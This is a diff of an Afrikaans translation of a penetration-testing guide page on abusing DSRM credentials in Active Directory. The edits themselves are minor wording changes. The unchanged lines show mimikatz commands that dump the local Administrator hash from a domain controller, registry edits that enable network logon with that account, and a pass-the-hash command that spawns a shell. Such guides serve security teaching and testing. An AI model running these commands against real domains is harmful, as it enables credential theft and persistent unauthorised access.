@@ -16,7 +16,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 # DSRM Kredensiale
 
-Daar is 'n **lokale administrateur** rekening binne elke **DC**. Met admin regte op hierdie masjien kan jy mimikatz gebruik om die **lokale Administrateur hash** te **dump**. Dan, deur 'n register te wysig om hierdie wagwoord te **aktiveer** sodat jy op afstand toegang kan verkry tot hierdie lokale Administrateur gebruiker.\
+Daar is 'n **lokale administrateur** rekening binne elke **DC**. Met administrateur regte op hierdie masjien kan jy mimikatz gebruik om die **lokale Administrateur hash** te **dump**. Dan, deur 'n register te wysig om hierdie wagwoord te **aktiveer** sodat jy op afstand toegang kan verkry tot hierdie lokale Administrateur gebruiker.\
 Eerstens moet ons die **hash** van die **lokale Administrateur** gebruiker binne die DC **dump**:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
@@ -27,7 +27,7 @@ Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-Dan, deur 'n PTH te gebruik, kan jy **die inhoud van C$ lys of selfs 'n shell verkry**. Let daarop dat om 'n nuwe powershell-sessie met daardie hash in geheue (vir die PTH) te skep, **die "domein" wat gebruik word net die naam van die DC masjien is:**
+Dan, deur 'n PTH te gebruik kan jy **die inhoud van C$ lys of selfs 'n shell verkry**. Let daarop dat om 'n nuwe powershell-sessie met daardie hash in geheue (vir die PTH) te skep, **die "domein" wat gebruik word net die naam van die DC masjien is:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
